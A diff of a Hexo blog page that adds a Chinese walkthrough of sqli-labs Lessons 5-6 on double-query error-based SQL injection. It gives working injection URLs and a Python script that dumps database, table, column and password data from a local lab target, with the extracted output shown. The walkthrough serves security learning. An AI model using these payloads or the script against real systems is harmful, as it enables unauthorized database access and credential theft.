@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="sql注入,sqli-labs,python," />
 
 
 
@@ -79,14 +79,18 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="tags">
-<meta property="og:url" content="http://yoursite.com/tags/index.html">
+<meta name="description" content="Less-5 GET- Double Query-Single Quotes -String基于get请求的双查询的单引号字符型注入什么叫双查询？双查询又可以叫做嵌套子查询，相当于在select语句中还有一个select语句，而里面的select语句称为子查询 select(select) 双查询你注入当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。">
+<meta name="keywords" content="sql注入,sqli-labs,python">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs-Less-5-6">
+<meta property="og:url" content="http://yoursite.com/2018/04/20/sqli-labs-Less-5-6/index.html">
 <meta property="og:site_name" content="Ahodor&#39;Via">
+<meta property="og:description" content="Less-5 GET- Double Query-Single Quotes -String基于get请求的双查询的单引号字符型注入什么叫双查询？双查询又可以叫做嵌套子查询，相当于在select语句中还有一个select语句，而里面的select语句称为子查询 select(select) 双查询你注入当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-04-19T00:53:06.656Z">
+<meta property="og:updated_time" content="2018-04-20T07:05:28.131Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="tags">
+<meta name="twitter:title" content="sqli-labs-Less-5-6">
+<meta name="twitter:description" content="Less-5 GET- Double Query-Single Quotes -String基于get请求的双查询的单引号字符型注入什么叫双查询？双查询又可以叫做嵌套子查询，相当于在select语句中还有一个select语句，而里面的select语句称为子查询 select(select) 双查询你注入当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。">
 
 
 
@@ -116,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/tags/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/04/20/sqli-labs-Less-5-6/"/>
 
 
 
 
 
-  <title>tags | Ahodor'Via</title>
+  <title>sqli-labs-Less-5-6 | Ahodor'Via</title>
   
 
 
@@ -271,40 +275,309 @@
 
   <div id="posts" class="posts-expand">
     
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/20/sqli-labs-Less-5-6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ahodor">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ahodor'Via">
+    </span>
+
     
-    
-    <div class="post-block page">
       <header class="post-header">
 
-	<h1 class="post-title" itemprop="name headline">tags</h1>
-
-
-
-</header>
-
-      
-      
-      
-      <div class="post-body">
         
         
-          <div class="tag-cloud">
-            <div class="tag-cloud-title">
-                4 tags in total
-            </div>
-            <div class="tag-cloud-tags">
-              <a href="/tags/python/" style="font-size: 12px; color: #ccc">python</a> <a href="/tags/sqli-labs/" style="font-size: 30px; color: #111">sqli-labs</a> <a href="/tags/sqlmap/" style="font-size: 12px; color: #ccc">sqlmap</a> <a href="/tags/sql注入/" style="font-size: 21px; color: #6f6f6f">sql注入</a>
-            </div>
-          </div>
+          <h1 class="post-title" itemprop="name headline">sqli-labs-Less-5-6</h1>
         
-      </div>
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-20T15:03:06+08:00">
+                2018-04-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
       
+
+      
+        <h2 id="Less-5-GET-Double-Query-Single-Quotes-String"><a href="#Less-5-GET-Double-Query-Single-Quotes-String" class="headerlink" title="Less-5 GET- Double Query-Single Quotes -String"></a>Less-5 GET- Double Query-Single Quotes -String</h2><h3 id="基于get请求的双查询的单引号字符型注入"><a href="#基于get请求的双查询的单引号字符型注入" class="headerlink" title="基于get请求的双查询的单引号字符型注入"></a>基于get请求的双查询的单引号字符型注入</h3><h3 id="什么叫双查询？"><a href="#什么叫双查询？" class="headerlink" title="什么叫双查询？"></a>什么叫双查询？</h3><p>双查询又可以叫做嵌套子查询，相当于在select语句中还有一个select语句，而里面的select语句称为子查询</p>
+<pre><code>select(select)
+</code></pre><h3 id="双查询你注入"><a href="#双查询你注入" class="headerlink" title="双查询你注入"></a>双查询你注入</h3><p>当在一个<strong>聚合函数</strong>，比如count函数后面如果使用<strong>分组语句</strong>就会把查询的一部分<strong>以错误的形式</strong>显示出来。</p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>count(*)</td>
+<td>统计表中所有记录的个数 </td>
+</tr>
+<tr>
+<td>count(列名)</td>
+<td>统计一列中值的个数，其中重复的记录也会被当做有效的记录。 </td>
+</tr>
+<tr>
+<td>count(distinct 列名)</td>
+<td>统计一列中值的个数，其中重复的记录只会被记录一次。 </td>
+</tr>
+<tr>
+<td>sum(列名)</td>
+<td>计算一列值的总和。 </td>
+</tr>
+<tr>
+<td>avg(列名)</td>
+<td>计算一列值的平均值。 </td>
+</tr>
+<tr>
+<td>max(列名)</td>
+<td>计算一列值中的最大值。 </td>
+</tr>
+<tr>
+<td>min(列名)</td>
+<td>计算一列值中的最小值。</td>
+</tr>
+<tr>
+<td>rand()</td>
+<td>生成0-1之间的小数随机值</td>
+</tr>
+<tr>
+<td>floor()</td>
+<td>只返回整数部分，小数部分舍弃</td>
+</tr>
+<tr>
+<td>round()</td>
+<td>函数四舍五入，大于0.5的部分进位，不到则舍弃</td>
+</tr>
+<tr>
+<td>concat()</td>
+<td>连接函数，可以连接多个字符</td>
+</tr>
+<tr>
+<td>group by</td>
+<td>将结果以分组的形式返回</td>
+</tr>
+</tbody>
+</table>
+<h3 id="什么时候使用双查询注入？"><a href="#什么时候使用双查询注入？" class="headerlink" title="什么时候使用双查询注入？"></a>什么时候使用双查询注入？</h3><p>适用于<strong>注入时没有显示位</strong>，但是在有显示位的时候同样适用，有显示位时不建议。<br>双查询注入语句的固定格式</p>
+<pre><code>union select 1 from (select+count(*),concat(floor(rand(0)*2),( 注入爆数据语句))a from information_schema.tables group by a)b
+</code></pre><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><pre><code>sqli-labs/Less-5/?id=1
+</code></pre><p>返回如下，与之前不同</p>
+<pre><code>Welcome    Dhakkan
+You are in...........
+</code></pre><h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><pre><code>select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a;
+</code></pre><p>分析：0x3a 表示冒号，rand()<em>2 返回 0-2之间的随机数，floor(rand()</em>2)返回整数0或1。</p>
+<p>concat()将返回 <strong>::关键信息::0</strong><br>或者<br><strong>::关键信息::1</strong></p>
+<h4 id="字段数"><a href="#字段数" class="headerlink" title="字段数"></a>字段数</h4><pre><code>sqli-labs/Less-5/?id=1&apos;  order by 6 %23 返回错误
+sqli-labs/Less-5/?id=1&apos;  order by 5%23 返回正确
+</code></pre><h4 id="数据库基本信息"><a href="#数据库基本信息" class="headerlink" title="数据库基本信息"></a>数据库基本信息</h4><pre><code>sqli-labs/Less-5/?id=1&apos; union select 1,2,3,count(*) ,concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a%23
+</code></pre><p>返回 </p>
+<pre><code>Welcome    Dhakkan
+Duplicate entry &apos;::security::1&apos; for key &apos;group_key&apos;
+</code></pre><p>当前数据库名</p>
+<pre><code>sqli-labs/Less-5/?id=1&apos; union select 1,2,3,count(*) ,concat(0x3a,0x3a,version(),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a%23
+</code></pre><p>版本号</p>
+<pre><code>Duplicate entry &apos;::5.5.53::0&apos; for key &apos;group_key&apos;
+</code></pre><h4 id="读取信息"><a href="#读取信息" class="headerlink" title="读取信息"></a>读取信息</h4><h4 id="数据库名-改变-limit-1-1的值获取所有的"><a href="#数据库名-改变-limit-1-1的值获取所有的" class="headerlink" title="数据库名(改变 limit 1,1的值获取所有的)"></a>数据库名(改变 limit 1,1的值获取所有的)</h4><pre><code>sqli-labs/Less-5/?id=1&apos; union select 1 from (select+count(*),concat(floor(rand(0)*2),( select schema_name from information_schema.schemata limit 1,1) )a from information_schema.tables group by a)b %23
+</code></pre><h4 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h4><pre><code>sqli-labs/Less-5/?id=1&apos; union select 1 from (select+count(*),concat(floor(rand(0)*2),( select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1) )a from information_schema.columns group by a)b %23
+</code></pre><h4 id="列名"><a href="#列名" class="headerlink" title="列名"></a>列名</h4><pre><code>sqli-labs/Less-5/?id=1&apos; union select 1 from (select+count(*),concat(floor(rand(0)*2),( select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1) )a from information_schema.columns group by a)b %23
+</code></pre><h4 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h4><pre><code>sqli-labs/Less-5/?id=1&apos; union select 1 from (select+count(*),concat(floor(rand(0)*2),( select password from security.users limit 0,1) )a from information_schema.columns group by a)b %23
+</code></pre><h3 id="python-小脚本用来爆破-limit太麻烦"><a href="#python-小脚本用来爆破-limit太麻烦" class="headerlink" title="python 小脚本用来爆破(limit太麻烦)"></a>python 小脚本用来爆破(limit太麻烦)</h3><pre><code>#!/usr/bin/python
+#-*-encoding:utf-8-*-
+
+import requests
+import re
+
+url = &quot;http://192.168.83.134/sqli-labs/Less-5/&quot;
+
+#获取数据
+def getData(url,payload,file_name):
+    files = open(file_name,&apos;a&apos;)
+    #print url+payload
+    r = requests.get(url+payload)
+    html = r.text
+    #print html
+    data = re.findall(r&apos;::\w{0,20}::&apos;,html)
+    for i in data:
+        files.write(i)
+    files.close()
+
+#获取所有数据库名
+def getDatabaseName():
+    filename = &apos;file_databasename.txt&apos;
+    for i in range(0,20):
+        payload_databases =  &apos;?id=1\&apos; union select 1 from (select+count(*),concat(0x3a,0x3a,( select schema_name from information_schema.schemata limit %s,1),0x3a,0x3a,floor(rand(0)*2) )a from information_schema.tables group by a)b %%23&apos; % i
+        getData(url,payload_databases,filename)
+
+#获取某个数据库的所有表名
+def getTableName(databasename):
+    filename = &apos;file_tablename.txt&apos;
+    for i in range(0,20):
+        payload_tables = &apos;?id=1\&apos; union select 1 from (select+count(*),concat(0x3a,0x3a,( select table_name from information_schema.tables where table_schema=%s limit %s,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a)b %%23&apos; % (databasename, i)
+        getData(url,payload_tables,filename)
+
+#获取某个表中的所有字段名
+def getColumnName(tablename):
+    filename = &apos;file_columnname.txt&apos;
+    for i in range(0,20):
+        payload_columns = &apos;?id=1\&apos; union select 1 from (select+count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name= %s limit %s,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a)b %%23&apos; % (tablename,i)
+        getData(url,payload_columns,filename)
+
+#获取某个表中的数据
+def getColumnData(databasename,tablename,columnname):
+    filename = columnname+&apos;_data.txt&apos;
+    for i in range(0,20):
+        payload_columndata = &apos;?id=1\&apos; union select 1 from (select+count(*),concat(0x3a,0x3a,(select %s from %s.%s limit %s,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a)b %%23&apos; % (columnname,databasename,tablename,i)
+        getData(url,payload_columndata,filename)
+
+if __name__ == &apos;__main__&apos;:
+    #获取数据库中所有的数据库名
+    print &apos;获取数据库中所有数据库名&apos;
+    getDatabaseName()
+
+    #获取security数据库的所有表
+    print &apos;获取security数据库的所有表&apos;
+    databasename = &quot;&apos;security&apos;&quot;
+    getTableName(databasename)
+
+    #获取表中的字段名
+    print &apos;获取users表的所有字段名&apos;
+    tablename = &quot;&apos;users&apos;&quot;
+    getColumnName(tablename)
+
+    #获取users表的username和password
+    print &apos;获取users表的username&apos;
+    databasename = &apos;security&apos;
+    tablename = &apos;users&apos;
+    columnname = &apos;username&apos;
+    getColumnData(databasename,tablename,columnname)
+</code></pre><p>输出四个文本：file_columnname.txt    file_databasename.txt  file_tablename.txt</p>
+<pre><code>cat file_databasename.txt file_tablename.txt file_columnname.txt username_data.txt 
+::information_schema::::challenges::::mysql::::performance_schema::::security::::test::
+::emails::::referers::::uagents::::users::
+::id::::username::::password::::first_name::::last_name::
+::Dumb::::Angelina::::Dummy::::secure::::stupid::::superman::::batman::::admin::::admin1::::admin2::::admin3::::dhakkan::::admin4::
+</code></pre><p>有些地方还是使用了硬编码不够灵活，使用burpsuit的intruct模块爆破更快</p>
+<h2 id="Less-6-GET-Double-Query-Double-Quotes-String"><a href="#Less-6-GET-Double-Query-Double-Quotes-String" class="headerlink" title="Less-6 GET- Double Query-Double Quotes -String"></a>Less-6 GET- Double Query-Double Quotes -String</h2><h3 id="基于get方法请求的双引号双查询字符注入"><a href="#基于get方法请求的双引号双查询字符注入" class="headerlink" title="基于get方法请求的双引号双查询字符注入"></a>基于get方法请求的双引号双查询字符注入</h3><h3 id="Less-6与Less-5基本一致，只要报单引号改为双引号即可，不再赘述。"><a href="#Less-6与Less-5基本一致，只要报单引号改为双引号即可，不再赘述。" class="headerlink" title="Less-6与Less-5基本一致，只要报单引号改为双引号即可，不再赘述。"></a>Less-6与Less-5基本一致，只要报单引号改为双引号即可，不再赘述。</h3><h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><p><a href="http://www.91ri.org/7636.html" target="_blank" rel="noopener">【科普文】双查询注入</a></p>
+<p><a href="https://mochazz.github.io/2017/09/23/Double_%20SQL_Injection/" target="_blank" rel="noopener">Double SQL Injection(双查询注入)</a></p>
+
       
     </div>
     
     
     
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/sql注入/" rel="tag"># sql注入</a>
+          
+            <a href="/tags/sqli-labs/" rel="tag"># sqli-labs</a>
+          
+            <a href="/tags/python/" rel="tag"># python</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/04/19/sqlmap使用/" rel="next" title="sqlmap使用练习">
+                <i class="fa fa-chevron-left"></i> sqlmap使用练习
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
   </div>
 
 
@@ -337,8 +610,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -389,6 +671,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-5-GET-Double-Query-Single-Quotes-String"><span class="nav-number">1.</span> <span class="nav-text">Less-5 GET- Double Query-Single Quotes -String</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基于get请求的双查询的单引号字符型注入"><span class="nav-number">1.1.</span> <span class="nav-text">基于get请求的双查询的单引号字符型注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#什么叫双查询？"><span class="nav-number">1.2.</span> <span class="nav-text">什么叫双查询？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#双查询你注入"><span class="nav-number">1.3.</span> <span class="nav-text">双查询你注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#什么时候使用双查询注入？"><span class="nav-number">1.4.</span> <span class="nav-text">什么时候使用双查询注入？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#测试"><span class="nav-number">1.5.</span> <span class="nav-text">测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#构造payload"><span class="nav-number">1.6.</span> <span class="nav-text">构造payload</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#字段数"><span class="nav-number">1.6.1.</span> <span class="nav-text">字段数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数据库基本信息"><span class="nav-number">1.6.2.</span> <span class="nav-text">数据库基本信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#读取信息"><span class="nav-number">1.6.3.</span> <span class="nav-text">读取信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数据库名-改变-limit-1-1的值获取所有的"><span class="nav-number">1.6.4.</span> <span class="nav-text">数据库名(改变 limit 1,1的值获取所有的)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#表名"><span class="nav-number">1.6.5.</span> <span class="nav-text">表名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#列名"><span class="nav-number">1.6.6.</span> <span class="nav-text">列名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数据"><span class="nav-number">1.6.7.</span> <span class="nav-text">数据</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#python-小脚本用来爆破-limit太麻烦"><span class="nav-number">1.7.</span> <span class="nav-text">python 小脚本用来爆破(limit太麻烦)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-6-GET-Double-Query-Double-Quotes-String"><span class="nav-number">2.</span> <span class="nav-text">Less-6 GET- Double Query-Double Quotes -String</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基于get方法请求的双引号双查询字符注入"><span class="nav-number">2.1.</span> <span class="nav-text">基于get方法请求的双引号双查询字符注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-6与Less-5基本一致，只要报单引号改为双引号即可，不再赘述。"><span class="nav-number">2.2.</span> <span class="nav-text">Less-6与Less-5基本一致，只要报单引号改为双引号即可，不再赘述。</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考："><span class="nav-number">2.3.</span> <span class="nav-text">参考：</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
